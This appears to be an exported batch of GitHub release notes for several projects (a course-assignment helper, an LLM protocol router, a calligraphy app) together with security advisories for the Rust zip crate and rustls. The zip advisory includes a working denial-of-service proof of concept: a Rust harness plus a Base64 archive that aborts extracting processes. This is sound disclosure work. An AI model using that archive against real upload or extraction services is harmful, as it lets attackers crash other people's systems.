Android recognition currently has no measured live-model accuracy. The new twelve-input corpus uses deliberately simulated responses; parse/render success is distinct from correct transcription or diagram understanding.

Evidence and baseline: docs/research/ANDROID_LIMITATIONS.md sections 4–5 and docs/research/ocr-fixtures/results.json.

Acceptance:
- Use self-authored or explicitly licensed, independently checked ground truth; include fractions, radicals, subscripts, matrices, calculus, degraded inputs and diagrams.
- Pin provider/model version and record a pre-approved request/cost budget. Do not use private student work or ship test keys.
- Report parsing, normalized exact match, semantic review, rendering and manual correction separately, with sample count and failures.
- Assess diagrams independently; do not infer reasoning quality from successful LaTeX rendering.
- Preserve original images/corrections and fail safely on malformed or untrusted output.

releases.name: LGXT Assistant 3.3.0 · Android Beta · Reinstall required
releases.body:
Android 3.3.0 Beta — reinstall required

**Existing Android 3.2.1 installations cannot update in place.** This Beta uses the new durable signing identity explicitly approved by the maintainer. Before uninstalling, export and independently verify any local question-document backups and keep them outside app-private storage. Uninstall deletes private data/preferences. Install this signed Beta, import the saved documents, compare their contents, and retain the external backup until recovery is confirmed. The original 3.2.1 predates question-document export; modified builds without an export facility must preserve valuable data through their existing backup/export mechanism or manual copies before uninstalling.

**旧版须先备份并核对资料，再卸载重装。卸载会删除应用私有数据与设置。** 题目文档备份不包含账号密码、API Key 或全部应用状态；原版 3.2.1 没有题目文档导出按钮，请先确认实际安装版本的资料已妥善保存。

[Installation and backup instructions](https://github.com/styayur/LGXT-Assistant/blob/v3.3.0-android/docs/android-beta.md) · [Signing identity and custody](https://github.com/styayur/LGXT-Assistant/blob/v3.3.0-android/docs/android-signing.md) · [Evidence and limitations](https://github.com/styayur/LGXT-Assistant/blob/v3.3.0-android/docs/research/ANDROID_LIMITATIONS.md)

Requires Android 7.0/API 24+, ARM64; x86_64 is included for emulation. Package `io.github.styayur.lgxt_assistant_mobile`, version `3.3.0`, versionCode `4`. Source-built Pillow 13 preserves full image decoding and limits. Mobile improvements include offline question notes, atomic saves/recovery, explicit native JSON backup/import, persistent HTTP warnings and tighter cancellation/request boundaries. Question-document exports omit usernames, passwords, API keys and other application state.

Public durable certificate SHA-256: `0ec0084b65aff166d379206ca244ea54904511e95573b15fd2159bd4bd604114`.
Historical 3.2.1 certificate SHA-256: `26c318acad5518ef0344e68e54bfb976a9ea23ab1d26a324f1c88c024ee86f49`.
Check APK bytes against `SHA256SUMS.txt` and the SDK-verified `APK-IDENTITY.json`. Test/debug and synthetic fixture APKs are not included.

Known limitations: official HTTPS remains unverified; HTTP authentication is blocked by default and explicit compatibility mode is plaintext. Real LGXT login/grade behavior, paid providers, live OCR accuracy and physical ARM64/vendor-device compatibility remain unverified. Local cancellation does not guarantee cancellation of provider billing. Mobile edits LaTeX/Markdown source and does not include the desktop rich editor or Word/PDF exporter; existing Word/PDF formulas remain LaTeX source.

Validation: [full build, durable signing and Android 15 x86_64 acceptance](https://github.com/styayur/LGXT-Assistant/actions/runs/40167960538) passed. The exact ordinary signed APK passed HTTP rejection, native synthetic-document import, same-certificate reinstall with notes retained, process restart and export/edit/import restoration. A separate fixture passed course/question/confirmation/vision-denial flows and 18 native decoder/storage checks. Python regression: 129 tests; required CI, dependency audits, CodeQL and CodeForge passed. The import-dialog dismissal and duplicate-event defect discovered in earlier withheld candidates is fixed.

Source: `e402b78e558cc763b0e1fad87991674bb8bc831f`.
APK SHA-256: `c0e2d4bfc307893baba457d8f1bf0e77ffc3884d87b88c750af4b9252b7811ad`.

releases.name: LGXT Assistant v4.2.0-web · Windows Web Beta
releases.body:
# Windows web v4.2.0-web (Beta)

Windows 10/11 x64. Local browser EXE, loopback only, SHA256SUMS.txt; retain its console and private launch link. No hosted website or WebView2 requirement. No Android asset belongs on this release.

# Assignment upgrade release notes

Published Windows beta channels: desktop **4.1.0** and web **4.2.0-web**. Android **3.3.0** remains unpublished source. Passing CI does not establish stable maturity. Availability is recorded in [verification](https://github.com/styayur/LGXT-Assistant/blob/main/docs/VERIFICATION.md) and on each GitHub release page.

The minor increments reflect additive assignment documents, contextual AI and recognition workflows. Desktop advances from 4.0.1 to 4.1.0; web from 4.1.0-web to 4.2.0-web; Android source from historical 3.2.1 to 3.3.0-android. Old workspace/chat files remain usable. Requiring explicit HTTP compatibility is an intentional security behavior change.

- Assignment workspace with original image, corrected question, LaTeX preview, Tiptap solution and source-selected question AI.
- Whole-image or percentage-crop recognition; edit and approve text/math before applying. Provider-neutral serialization and conservative, user-confirmed vision capability.
- “一键满分” retained with assignment/course/all scope, counted preview, explicit confirmation, sequential progress, cancellation and truthful unknown outcomes.
- HTTP access blocked by default, no downgrade or write replay, isolated image fetches, destination/content/resource checks and patched image/math dependencies.
- Recoverable schema-1 question files, previous-version backup and Markdown/Word/PDF export. Equations in Word/PDF are source; validated embedded editor raster images are also included.
- Separate Android visual/input improvements, zoomable original images, saved notes, contextual AI and recognition; no desktop rich editor/crop/Word/PDF parity claim.

The official HTTP endpoint responds; HTTPS was not verified. Insecure compatibility transmits passwords/tokens/grades in plaintext and shows a persistent warning. No real account login, grade writes, paid model requests or live OCR accuracy study was performed. Automated model and platform workflows use synthetic fixtures. Unknown models require capability confirmation. No vector retrieval, invented citations, comprehensive OCR, handwriting or diagram guarantee.

Android signing secrets and physical-device/emulator acceptance are unavailable. Its release must remain unpublished. Windows packaging and publication require checks against the exact intended source/tag; checksums are meaningful only for the assets actually attached to that release. Historical releases and tags are not rewritten.

Application license remains AGPL-3.0-only. Tiptap/ProseMirror MIT notices are distributed; prior attribution remains in NOTICE.md.

The Android OAuthlib audit blocker was resolved by migrating to Flet 1.0.5 and requiring OAuthlib >=4,<5. The mobile control flows and atomic local notes store are regression-tested; no advisory is ignored. Android signing and device acceptance remain unavailable, so no APK is published.



Uploaded assets were downloaded, compared with SHA256SUMS and GitHub digests, and launched successfully before publication. Source: 15b849cbf024e36d16e6b49abe46967435fbab13. Verification: https://github.com/styayur/LGXT-Assistant/actions/runs/40003724789.


Android remains unpublished: Flet's Android wheel index supplies Pillow 12.2/12.3 but no security-required Pillow 13 arm64 wheel. No downgrade or ignored advisory was used. Signing credentials and device acceptance are also unavailable.

releases.name: LGXT Assistant 4.1.0 · Windows 网页版
releases.body:
# LGXT Assistant 4.1.0 · Windows 网页版

在 Windows 10 / 11 x64 上双击 `LGXT-Assistant-Web.exe`，程序会启动本机服务并打开默认浏览器。无需 Python、Node.js 或 WebView2。保留启动窗口，使用结束后按 Ctrl+C 关闭服务。

- Edge / Chrome 中使用课程登录、课程与作业查看、题目整理、AI 流式对话和历史会话。
- 使用浏览器选择文本与图片附件，Markdown 会话通过浏览器下载。
- 设置中输入 Windows 导出目录，Word / PDF 保存到本机。
- 与桌面版共用 `%APPDATA%\LGXT-Assistant` 的资料和系统凭据库，避免同时运行两版编辑资料。
- 服务仅监听 `127.0.0.1`，每次启动生成独立连接凭证并检查请求来源。启动链接不要分享；此版本不提供公网或局域网多人服务。

刷新当前标签页可以继续使用。关闭标签页后可使用启动窗口里的链接重新打开。退出并重启程序后，旧链接失效。

GitHub 托管源码和 Windows 下载包；完整功能需要本机 Python 服务，不能作为纯静态 GitHub Pages 网站运行。现有 4.0.1 桌面版下载继续保留。

没有使用真实账号执行成绩提交或付费 AI 请求。

## 验证

- Python 测试 50 项通过，包括 8 项新增本机 HTTP 接口、来源/凭证检查和静态资源边界测试。
- PyInstaller 单文件 EXE 在 Windows 上实际启动，并通过 Chromium 自动化验证：连接、设置持久化、刷新恢复、会话 Markdown 下载、1280×720 / 1920×1080 布局、无 JavaScript 异常。
- 可复现命令：`py -3.13 -m pytest -q`、`py -3.13 scripts/check_web.py --exe dist/LGXT-Assistant-Web.exe`。

![Windows 网页版验证界面](../screenshots/windows-web.png)

releases.name: LGXT Assistant 4.0.1 · 全新桌面与启动修复
releases.body:
# LGXT Assistant 4.0.1

这次 Windows 更新带来全新的三栏桌面界面，并修复多种导致用户无法进入或一直等待的情况。

## 下载后使用

- **LGXT-Assistant.exe**：单文件版本，下载后双击运行。首次启动需要准备文件，请稍等。
- **LGXT-Assistant-portable.zip**：完整解压后运行其中的 `LGXT-Assistant-portable.exe`，保留 `_internal` 文件夹。压缩包内附使用说明。
- **LGXT-Assistant-4.0.1-User-Guide.pdf**：13 页中文说明，面向使用者，包含安装、登录、课程、AI 对话、导出、备份和故障排查。
- **SHA256SUMS.txt**：下载文件的 SHA-256 校验值。

适用于 Windows 10 / 11 x64，需要 Microsoft Edge WebView2 Runtime。普通使用者无需安装 Python 或 Node.js，请勿将 GitHub 自动提供的 Source code 当作安装包。本次不提供 MSI 或新的 Android APK；Android 用户继续使用历史 v3.2.1 版本。

## 修复无法进入

- 等待桌面连接就绪后再加载资料；连接失败时显示重试提示，避免静默进入浏览器预览模式。
- 系统凭据库响应缓慢不再阻塞主界面；单条历史会话读取失败不影响进入。
- 损坏的偏好、会话索引等本地资料先备份，再使用可用内容；旧配置中的非法开关值和含 `%` 的路径不再导致启动异常。
- 课程登录等待超过 20 秒会恢复操作并显示错误，可取消或重试；已取消的请求不会随后自动登录。
- 缺失界面资源、依赖或 WebView2 时显示启动帮助，提供兼容界面、运行时下载和完整安装包入口。

## 新版桌面

深色、浅色与跟随系统主题；可折叠导航与上下文面板；AI 流式对话、停止、编辑、重新生成、复制和导出；Markdown、代码高亮、公式与表格；会话历史、文件引用、工作区任务与提示词库；模型服务配置、连接测试和命令面板。

课程、作业、参考答案、题目图片、Word / PDF 导出及需确认的成绩提交继续保留。课程账号和 AI 模型分别连接，未配置 AI 不影响课程功能。旧 Tk 界面可通过启动帮助或 `--legacy` 打开。

## 更新与验证

关闭旧版后，将新版解压到新文件夹。资料保存在 `%APPDATA%\LGXT-Assistant`，更新前可复制该文件夹备份；系统凭据库中的密码和密钥需要单独管理。

发布流程先执行 Python 测试、前端构建、浏览器交互测试，再验证单文件 EXE 和从 ZIP 解压的便携版确实能加载本地界面并完成 Python 桥接，全部通过后才发布附件。示例截图使用测试数据；未使用真实账号执行成绩提交或付费模型请求。

releases.name: LGXT Assistant v3.2.1 · 登录修复 + 界面现代化
releases.body:
# LGXT Assistant v3.2.1

## 版本主题
登录稳定性修复 · Windows 界面现代化 · 移动端体验完善

## 重要修复：登录卡在 CONNECTING
- **根因**：移动端使用 `page.run_task(同步函数)` 触发 Flet 断言失败（Flet 仅接受协程函数），
  登录成功后无法跳转，界面停留在 CONNECTING。
- **修复**：改为线程安全的直接 UI 调度（任意线程调用控件 + `page.update()`），并增加异常兜底。
- **兜底体验**：登录增加 20 秒超时看门狗，超时自动返回登录页并提示；
  CONNECTING 页面提供「取消 / 重试」按钮，不会再出现无法退出的等待状态。
- 同时降低请求重试次数（3→2）与退避时间，弱网下更快给出结果。

## Windows 界面现代化
- 采用现代系统 UI 字体（Segoe UI Variable Text / Segoe UI，自动回退微软雅黑）
- 切角面板新增顶部微高光带（玻璃质感），按钮新增轻投影与更明确的悬停/按下反馈
- 侧栏导航新增左侧 2px 强调条与当前页面高亮状态
- 新增 `Ctrl+R` 刷新当前页面
- 保留宇宙星链视觉（星空、光轨、恒星系/行星、代码雨退出、ESC/F11）

## 移动端（Android）
- 顶栏使用 SafeArea，自动避让状态栏与刘海；顶栏加高，触控更友好
- 返回键逐级返回上一级菜单；根菜单连按两次返回才退出
- 底部导航：仪表盘 / 课程 / 设置；详情页提供显式返回箭头
- 功能：登录、仪表盘（待激活/已完成/平均分）、课程→作业→题目浏览、图片查看、成绩提交
- 移动端不含 Word/PDF 导出（请在 Windows 版导出）

## 产物与校验

| 文件 | 平台 | 说明 |
|---|---|---|
| `LGXT-Assistant-3.2.1-android.apk` | Android | 主推：侧载安装（Android 7.0+，三套 ABI） |
| `LGXT-Assistant-3.2.1-setup.msi` | Windows | 用户级安装包，无需管理员，含开始菜单与卸载项 |
| `LGXT-Assistant.exe` | Windows | 单文件版（已签名） |
| `LGXT-Assistant-portable.zip` | Windows | 便携版（已签名主程序） |
| `LGXT-Assistant-SelfSigned.cer` | Windows | 自签名公钥（可选，仅测试） |
| `SHA256SUMS.txt` | 通用 | 全部文件 SHA-256 校验值 |

```powershell
Get-FileHash .\LGXT-Assistant-3.2.1-android.apk -Algorithm SHA256
Get-AuthenticodeSignature .\LGXT-Assistant.exe | Format-List Status,SignerCertificate
```

## 安装提示
- **Android**：允许「安装未知应用」后点击 APK；提示「应用未安装」时先卸载旧版本并清理空间。
- **Windows MSI**：双击安装；卸载用「设置 → 应用」或
  `msiexec /x LGXT-Assistant-3.2.1-setup.msi /qn /norestart`。
- Windows 产物使用自签名证书，SmartScreen 会提示未知发布者（预期）；
  消除提示需购买 CA 代码签名证书后用 `packaging/sign.ps1` 重新签名。

## 构建
- Android：Flet 0.25.2 + Flutter 3.24.5 + Android SDK 37 + JDK 17，由 GitHub Actions 云端构建
- Windows：PyInstaller（单文件 / 便携版）+ WiX v3（MSI）+ Authenticode 签名
- 测试：GitHub Actions `tests.yml` 在 windows-latest 运行 pytest

## 许可
GPL-3.0-or-later · 仅限学习交流使用，请勿转卖或用于商业用途 · Author: Styayur

> Maintenance audit (2026-10-16): prefer running the reviewed checkout/archive directly. The optional installer's non-Windows launcher resolves the entry path incorrectly, and its failure-recovery condition can throw before restoring the previous installation. Existing routing tests do not cover those installer paths. Do not rely on installer rollback; preserve configuration separately. [Audit and blocked documentation PR](https://github.com/styayur/OmniRoute-PS/pull/4). Protocol/local-mock evidence is not end-to-end certification of every desktop client or provider. Release assets are unchanged.

---

OmniRoute-PS v0.2.0 is a core architecture release that turns the v0.1 local MVP into a stable local LLM protocol router.

## Highlights

- RunspacePool server with reusable workers and bounded concurrency
- Canonical protocol IR for OpenAI Chat, OpenAI Responses, and Anthropic Messages
- Native Claude Code-compatible `/v1/messages`
- Cross-protocol tools for OpenAI, Anthropic, and Gemini core paths
- Capability-aware routing for protocol, tools, vision, and streaming
- Refined provider runtime state and error-aware circuit breaking
- Atomic config hot reload with invalid-reload rollback
- `/health/live`, `/health/ready`, enhanced `/health`, and Prometheus-compatible `/metrics`
- CORS disabled by default and restricted to explicit origins when enabled

## Architecture

The server no longer uses ThreadJob-per-request and no longer re-dot-sources all source files for every request. `src/OmniRoute.psm1` is imported once per pooled worker, and pipelines borrow reusable runspaces.

## Verification

- Pester: 60 passed, 0 failed
- PSScriptAnalyzer: 0 issues
- Windows CI and Ubuntu CI validated
- Local schema validation, startup smoke, health/readiness, metrics, CORS, bounded queue overload, hot reload, `/v1/messages`, OpenAI SSE, and Anthropic SSE covered by tests
- Benchmark: 100 sequential local mock completions improved from 172.5 ms/request to 21.95 ms/request; 50 parallel requests completed in 552.0 ms total

## Compatibility notes

- Responses support covers the documented core fields.
- Cross-protocol tools cover the required OpenAI/Anthropic/Gemini core paths; uncommon provider-specific tool schemas return `unsupported_feature`.
- Streaming fallback after upstream headers are sent is not possible; an error event is emitted.
- Runtime health, metrics, circuit state, and rate-limit state are process-local.
- Client authentication is not implemented; keep the default loopback binding unless the environment is trusted.

The ZIP artifact and `SHA256SUMS.txt` are attached.

security_advisory.summary: zip: Unbounded Symlink-Target Handling Can Abort Or Exhaust Memory During Extraction
security_advisory.description:
### Summary

The symbolic-link branch of `ZipArchive::extract_internal()` allocates a buffer using an attacker-declared size before reading any entry data. A 112-byte archive terminates the extracting process with `SIGABRT` through this infallible allocation.

### Details

```rust
#[cfg(any(unix, windows))]
if file.is_symlink() {
    let mut target = Vec::with_capacity(file.size() as usize); // @audit unbounded memory allocation
    file.read_to_end(&mut target)?;
    drop(file);
    make_symlink(&outpath, &target, &self.shared.files)?;
    continue;
}
```

[`src/read/mod.rs#L399-L405`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/mod.rs#L399-L405) (reviewed commit `6f09b306`); the same code is at [`src/read.rs#L417-L418`](https://github.com/zip-rs/zip2/blob/v8.6.0/src/read.rs#L417-L418) in released v8.6.0.

Both inputs are attacker-controlled:

- [`ZipFile::size()`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/zipfile.rs#L243-L246) returns `uncompressed_size` verbatim from the central directory record. A ZIP64 extended-information extra field widens it to a full `u64` ([`src/read/mod.rs#L619-L625`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/mod.rs#L619-L625)). It is never cross-checked against the compressed size, the remaining archive length, or any platform-appropriate bound for a symlink target.
- [`ZipFile::is_symlink()`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/zipfile.rs#L256-L260) is decided entirely by the central directory's external-attributes field, via the `S_IFLNK` bit.

**Memory allocation failure → uncatchable process abort.** The reservation is sized from the declared `uncompressed_size` before a single byte of the entry is read. `Vec::with_capacity()` is infallible: on allocator refusal it calls `handle_alloc_error()`, which aborts the process. This is not a Rust panic — it is not caught by `catch_unwind()`, is unaffected by `panic = "unwind"`, and is not contained by isolating the call in a worker thread. This was verified by wrapping the call in all three at once; the process still died with exit 134.

The declared value needed is a property of the host's address space, not of reachability. On a 64 GB host with heuristic overcommit, declared sizes from roughly `2^38` upward abort reliably. Sizes at or above `2^63` instead trip `Vec`'s internal capacity check and produce a *catchable* `capacity overflow` panic, so an attacker simply avoids that band. The reproducer declares `2^62`, which exceeds the 47-bit user address space of x86-64 Linux outright and therefore aborts deterministically regardless of installed RAM or overcommit policy. Under a `ulimit -v` cap or a memory-constrained container the threshold drops far enough that a plain 32-bit `uncompressed_size` with no ZIP64 field suffices — a virtual-memory limit lowers the bar rather than mitigating the defect.

This is process termination, not memory exhaustion: `Vec::with_capacity()` only maps address space and never touches pages, so resident memory stays flat and the abort happens on the refused reservation itself, before any byte is read.

### PoC

The reproducer consists of the following `zip` harness and payload. It requires only the `zip` crate; use a standard Base64 decoder to materialise the archive before running it.

```toml
[package]
name = "zip-poc"
version = "0.1.0"
edition = "2021"

[dependencies]
zip = "8.6.0"
```

```rust
use std::{env, fs::File, io::BufReader};

fn main() {
    let archive_path = env::args().nth(1).expect("usage: poc <archive.zip>");
    let outdir = std::env::temp_dir().join("zip-poc");
    std::fs::create_dir_all(&outdir).unwrap();

    let file = File::open(archive_path).unwrap();
    let mut archive = zip::ZipArchive::new(BufReader::new(file)).unwrap();
    let r = archive.extract(&outdir);            // <-- process dies here
    println!("SURVIVED: {:?}", r);
}
```

Save the Base64 payload below as `archive.b64`, remove its whitespace, decode it with a standard Base64 decoder (for example, `base64 -d archive.b64 > archive.zip` on Linux), and run `cargo run --release -- archive.zip`.

**Uncatchable abort — 112 bytes.** One `Stored` entry named `a`; external attributes `0xA1FF0000` (`S_IFLNK|0777`); ZIP64 extra field declaring `uncompressed_size = 2^62`; zero-byte payload. sha256 `0c68c3934f22651a6bd2726f7d58140124b1839196a1d0ae468864cdfda74676`.

```
UEsDBC0AAAAAAAAAAAAAAAAAAAAAAP////8BAAAAYVBLAQItAy0AAAAAAAAAAAAAAAAAAAAAAP//
//8BAAwAAAAAAAAAAAD/oQAAAABhAQAIAAAAAAAAAABAUEsFBgAAAAABAAEAOwAAAB8AAAAAAA==
```

Observed on x86-64 Linux, rustc 1.93.1, release profile, against both the reviewed commit and released v8.6.0:

```
entries=1
memory allocation of 4611686018427387904 bytes failed
Aborted (core dumped)          # exit 134
```

The `SURVIVED` line never prints. Wrapping `extract()` in `catch_unwind` inside a spawned thread with `panic = "unwind"` produces the identical outcome.

### Impact

Applications running on Unix or Windows targets that call `ZipArchive::extract()` on attacker-supplied input are affected, with default features and no special configuration. The malicious 112-byte archive causes an unrecoverable, uncatchable termination of the extracting process, repeatable at will and not mitigable at the call site with `catch_unwind`, a worker thread, or a pre-flight metadata check.

Upload handling, mail-attachment processing, package and artefact ingestion, backup restore and container-image layer extraction all match this pattern. No confidentiality or integrity property is affected: no memory unsafety, no out-of-bounds access, no disclosure and no data corruption.

### Suggested remediation

Before allocating, compare `file.size()` with a documented, platform-appropriate maximum symlink-target length and reject entries that exceed it. Alternatively, replace `Vec::with_capacity()` with fallible `try_reserve()` and return an I/O error when allocation fails. Do not use Linux's `PATH_MAX` as a cross-platform contract.

Apply the allocation fix to `src/read/stream.rs` as defence-in-depth, although its symlink path is currently unreachable because streaming entries have no symlink attributes.

For reference, the crate already applies exactly this defence to another untrusted size on the same path: `ZipArchive::new()` clamps a suspicious `number_of_files` to zero and explicitly rejects an oversized central directory before reserving ([`src/read/zip_archive.rs#L185-L202`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/zip_archive.rs#L185-L202)). The symlink branch received neither guard. A survey of `Vec::with_capacity` across `src/` finds exactly two sites sized from untrusted input: `src/read/mod.rs:401` and `src/read/stream.rs:73`.

security_advisory.summary: rustls: ECH rejection can expose buffered application data to authenticated outer server before `ech_required` alert
security_advisory.description:
In rustls 0.23.44 and 0.23.45, application data that a client buffers before the handshake completes is sent to the server even when the server rejects Encrypted Client Hello (ECH).

When the server rejects ECH, the client completes the handshake with the outer ClientHello and authenticates the server against the ECH config's `public_name`. At the end of the handshake, `start_traffic()` encrypts and queues any plaintext buffered by `ClientConnection::writer()`. It does this *before* checking for `EchStatus::Rejected` and queueing the `ech_required` alert.

The application then receives `Error::PeerIncompatible(ServerRejectedEncryptedClientHello)`, as expected. However, the client is still expected to call `write_tls()` to send the fatal alert, and that call also sends the encrypted application data. The server decrypts the data and only then receives the alert.

The ordering bug is older than 0.23.44. Before 0.23.44, the client checked the server certificate against the inner server name rather than `public_name`, so a correctly configured server failed certificate verification first and no data was sent. 0.23.44 fixed that check, which makes the ordinary rejection path reachable.

# Impact

Plaintext meant for the inner server, the one named in the encrypted ClientHello, goes to the client-facing server identified by `public_name`. That server is properly authenticated, so this is not an attack by an unauthenticated party. However this violates [RFC 9849](https://www.rfc-editor.org/info/rfc9849), which says the following:

- Section 6.1.6: if the handshake and authentication succeed after ECH rejection, the client "MUST ... abort the connection with an "ech_required" alert **before sending any application data to the server.**"
- Section 6.1.7: the certificate is checked only against `public_name`, and the connection "MUST NOT" be reported as successful to the application. rustls does report failure correctly. The problem is only that data is sent before the alert.

This affects only clients that meet all of these conditions:

- They use `EchMode::Enable`. GREASE ECH is not affected.
- They write application data before the handshake completes.
- They connect to a server that rejects their ECH config, for example because the config is stale. This is the same case where the server returns retry configs.

The usual client response to rejection is to retry with the server's retry configs. In that case, the data has already gone to the outer server.

security_advisory.summary: rustls: An unauthenticated ServerHello poisons the per-name key-exchange record, so later ClientHellos carry only a classical X25519 share
security_advisory.description:
## Summary

The client records the server-selected key-exchange group per server name when it processes the ServerHello, before the server is authenticated. A network attacker can answer one connection attempt for a target name with a ServerHello that selects X25519 and close the connection. Later ClientHellos for that name carry one X25519 share while supported_groups still lists X25519MLKEM768 first. If the server accepts that share instead of sending a HelloRetryRequest, the handshake completes with classical key exchange only and no error.

An attacker that answers one connection attempt for the target name with a ServerHello selecting X25519 changes every later ClientHello of that client for that name, for as long as the entry stays in the store. No certificate or completed handshake is needed: it parses the ClientHello, sends the ServerHello, and closes.

TLS 1.3 transcript binding stops an on-path attacker from editing the ClientHello of one connection. It does not stop the attacker from steering the client's prediction state beforehand, because that state is written from an unauthenticated message.

## What does not trigger it

- Servers that send a HelloRetryRequest. The connection stays hybrid and costs one extra round trip.
- A client configuration with resumption disabled: nothing is stored.
- A different server name: the record is per name.

## Impact

If the genuine server picks the group for which a share is present, instead of sending a HelloRetryRequest for its preferred hybrid group, the handshake completes with classical key exchange only, between two peers that both support the hybrid group. No error is raised. The confidentiality of recorded sessions against a future quantum adversary is lost for those connections (harvest now, decrypt later). There is no key compromise and no authentication bypass.

Note that this behaviour is discussed at length in [draft-ietf-tls-key-share-prediction](https://www.ietf.org/archive/id/draft-ietf-tls-key-share-prediction-01.html#name-security-considerations) so the actual security impact is largely down to a server policy decision.

security_advisory.summary: Rustls: Session Debug formatting exposes TLS master secrets and resumption PSKs
security_advisory.description:
### Summary

Formatting a client session value with Debug exposes its TLS 1.2 master secret or TLS 1.3 resumption PSK. A custom session store that logs these values can disclose keys to readers of the logs. Ordinary connection and built-in cache diagnostics remain redacted, and the session-store interface already warns that its values are sensitive.

### Details

Derived formatters traverse the session's secret-bearing fields. This conflicts with the project's explicit [key-material redaction policy](https://github.com/rustls/rustls/blob/99f2358cae2954837dbb866faf6727de75489ab9/SECURITY.md#boundary-public-api).

### Proof of concept

Custom `ClientSessionStore` implementations could leak secret data by using the provided `Tls12ClientSessionValue` or `Tls13ClientSessionValue` in a way that triggers its implementation of the `Debug` trait.

### Impact

Such store implementations could leak the master secret for the TLS connection.

Thanks to OpenAI [OutboundDisclosures@openai.com](mailto:OutboundDisclosures@openai.com) for the disclosure.

security_advisory.summary: Rustls: Brotli certificate decompression can allocate an attacker-controlled amount of memory up to 1 GiB before authentication.
security_advisory.description:
### Summary

The built-in (but disabled by default) Brotli certificate decoder bounds the output buffer but accepts an input-selected history window. A header of five bytes can specify a 1 GiB window allocation. A peer can abort a process whose allocator cannot satisfy that request. A client must enable Brotli and connect to the peer; a server must enable Brotli and request a client certificate. Neither direction requires a trusted attacker certificate.

### Details

rustls calls `BrotliDecompress` which enables Brotli's large-window extension. rustls applies a limit to certificates, but this applies to the decompressed result, and not to any internal allocations the process requires.

### Impact

Client applications that enable the `brotli` feature will be vulnerable to malicious servers. Server applications that enable the `brotli` feature and enable client authentication will be vulnerable to malicious clients.

Potential for denial of service due to memory exhaustion from peers sending malicious Brotli-encoded certificates, for applications that enable Brotli decompression.

### Acknowledgement
Thanks to OpenAI [OutboundDisclosures@openai.com](mailto:OutboundDisclosures@openai.com) for the disclosure.

releases.body:
# v0.7.1 — Japanese Kanji coverage

This release adds **Klee One Regular** as an independent modern Japanese handwriting candidate and a small, Japanese-only **Source Han Serif JP derived subset** as a visibly labelled coverage fallback. Yuji remains the primary calligraphy source; historical CODH samples remain a separate category. Strict Japanese mode never silently substitutes Chinese glyphs.

The reproducible [coverage benchmark](https://github.com/styayur/calligraphy-studio/blob/v0.7.1/docs/JAPANESE_COVERAGE.md) measures JIS X 0213 Kanji cmap coverage at **6,745/10,051 with Yuji alone** and **10,051/10,051 with the combined Japanese library**. Jōyō, Jinmeiyō, JIS X 0208 Kanji and the reviewed project corpus are also complete in the combined benchmark. These figures do not claim complete Japanese typography, historical coverage, IVS support or aesthetic correctness.

The fonts are redistributed under **SIL OFL 1.1**. Their upstream versions, checksums, licences, provenance and reproducible fallback subset recipe are recorded in the source manifests and offline package notices. Existing v0.7.0 projects remain readable; the project schema remains version 2.

Downloads include the Windows x64 installer and portable build, offline Web ZIP, production-signed Android APK, SHA256SUMS.txt and build/signing receipts. All packages come from the same tagged commit. The Windows binaries remain **unsigned** and may prompt SmartScreen. The Android APK is signed with the persistent release identity; its certificate fingerprint is in the signing receipt and [recovery guidance](https://github.com/styayur/calligraphy-studio/blob/v0.7.1/docs/RELEASE_SIGNING_0.7.1.md).

Automated browser, API, Windows native renderer, Android build/signature, package and licence checks passed. Physical Android storage/share/lifecycle testing and the Windows installer wizard, shortcuts, upgrade/uninstall and visible IME acceptance remain manual validation gaps.

releases.name: East Asian Calligraphy Workbench v0.7.0
releases.body:
# v0.7.0 — East Asian Calligraphy Workbench

Chinese calligraphy remains supported. Japanese is the first expansion beyond Chinese; other East Asian traditions are not shipped in this release.

- Separate Unicode semantic identity from visual glyph variants and cultural provenance.
- Add five Yuji 3.002 fonts under OFL 1.1, including explicit Akari/Akebono hentaigana variants. Fonts are not historical manuscripts.
- Add HarfBuzz Japanese shaping, mixed kanji/kana and glyph-cell horizontal/vertical composition.
- Add 20 CODH v2 historical crops and attributed ink-mask derivatives under CC BY-SA 4.0; preserve source occurrences and unknown cultural facts. Full corpus remains an optional verified local import.
- Keep Chinese/Japanese candidate traditions isolated by default; cross-tradition exploration is explicit.
- Preserve licence, rights, attribution, Unicode/variant identity and checksums in project and artwork exports.
- Migrate project/database schema v1 → v2; permanent fixtures test semantic and rights integrity across save/reload/export. Back up SQLite/projects before upgrading; downgrade by restoring backups.
- Packages share a canonical asset/third-party manifest, offline licence viewer, version checks and build provenance. No cloud account is required.

## Security and release status

Production web/desktop npm and resolved API dependency audits are clean in the recorded audit. Starlette/FastAPI runtime updates fix six unique API advisories; narrow global-agent, PostCSS parser and source-map updates fix additional toolchain findings. Five development dependency findings trace to the unpatched braces stack-exhaustion advisory in Tailwind 3 tooling; they are retained, scoped and documented in `docs/DEPENDENCY_AUDIT_0.7.0.md`. No vulnerable tooling enters renderer bundles or packaged application dependencies. This does not mean the entire development tree has zero vulnerabilities.

This release publishes the **Windows x64 installer**, **Windows x64 portable executable** and **offline Web ZIP**, with `SHA256SUMS.txt`, build provenance and signing receipts. Windows binaries are **unsigned** and may trigger SmartScreen or organisational restrictions.

**No Android APK is published for v0.7.0.** The Android build and package checks pass locally, but only debug preview signing is available. Production signing and physical Android storage/share/lifecycle acceptance remain outstanding. The automated Windows checks launch the actual unpacked and portable applications; installer wizard, shortcuts, upgrade/uninstall and visible IME acceptance remain unverified. These limitations are disclosed rather than treated as passed.

Conditional signing and verification are documented in [signing guidance](https://github.com/styayur/calligraphy-studio/blob/v0.7.0/docs/RELEASE_SIGNING_0.7.0.md). A production APK is accepted only with complete private signing configuration and successful signature validation; missing credentials omit Android, and partial credentials fail the release.

## Known limitations

Japanese composition is per glyph cell. Full kinsoku shori, advanced punctuation/orientation rules, connected-kana continuity, tate-chū-yoko, arbitrary IVS and comprehensive historical orthography are not implemented. The sample is not complete kuzushiji coverage or proof of historical authenticity. Download resume restarts the download; local import checkpoints are repeatable. Large export ZIPs assemble in browser memory. Canvas/FreeType antialiasing can vary across platforms.

